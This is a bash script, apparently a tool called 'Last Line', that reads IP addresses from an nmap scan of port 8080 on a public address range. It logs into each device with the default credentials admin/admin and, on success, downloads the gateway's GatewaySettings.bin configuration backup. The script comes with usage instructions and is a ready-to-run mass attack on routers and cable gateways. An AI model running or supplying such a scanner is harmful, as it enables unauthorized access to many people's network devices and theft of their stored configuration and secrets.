#!/bin/bash

USERNAME="admin"
PASSWORD="admin"

function gethelp {
  printf "\nLast Line script by @faustinoaq\n"
  printf "(awk, bash, cat, curl, grep, sort, tee)\n\n"
  printf "Get IP list with nmap:\n"
  printf "# nmap -v -p8080 -Pn 190.140.0-1.0/29 -oG tmp\n"
  printf "Filter IPs in a new file:\n"
  printf "# cat 190.140.tmp | grep open | awk '{print \$2}' | tee > 190.140.ips\n\n"
  printf "Execute Last Line script:\n"
  printf "# ./lastline.sh 190.140.ips\n\n"
}

ip=$(basename $1 .ips)

function clean {
  sort -u $ip.ok > $ip.tmp
  cp $ip.tmp $ip.ok
  sort -u $ip.fail > $ip.tmp
  cp $ip.tmp $ip.fail
}

function showinfo {
  printf "$1\n" >> $ip.$2
  clean
  y=$(wc -l $ip.ok | awk '{print $1}')
  n=$(wc -l $ip.fail | awk '{print $1}')
  t="Stat=$3/$4, $5%%, Ok=$y, Fail=$n"
}

function main {
  if [[ -f $1 ]]
  then
    printf $ip | grep -q -E "^[.0-9]{3,15}$"
    if [[ $? != 0 ]]
    then
      printf "Error: <ip>.ips filename\n"
      exit 1
    fi
    cat $1 | grep -m 1 -q -E "^[.0-9]{7,15}$"
    if [[ $? == 0 ]]
    then
      IP=$(cat $1)
      mkdir -p bin
      touch $ip.ok
      touch $ip.fail
    else
      printf "No IP to check!\n"
      exit 1
    fi
  else
    gethelp
    exit 1
  fi
  j=0; x=0; y=0; n=0
  c=$(wc -l $1 | awk '{print $1}')
  printf "$(date -u) Analyzing $c IPs...\n"
  for i in $IP
  do
    j=$((j+1))
    x=$(((j*100)/c))
    curl -s -d "loginUsername=$USERNAME&loginPassword=$PASSWORD" -m 5\
    -D $ip.header http://$i:8080/goform/login > /dev/null
    cat $ip.header | grep -q RgConnect.asp
    if [[ $? == 0 ]]
    then
      curl -s -m 5 -o $ip.bin http://$i:8080/GatewaySettings.bin
      if [[ $? == 0 ]]
      then
        mv $ip.bin bin/$i.bin
        showinfo $i "ok" $j $c $x
      else
        showinfo $i "error" $j $c $x
      fi
    else
      showinfo $i "fail" $j $c $x
    fi
    printf "$t, IP=$i                   \r"
  done
  printf "\n"
  exit 0
}

main $1
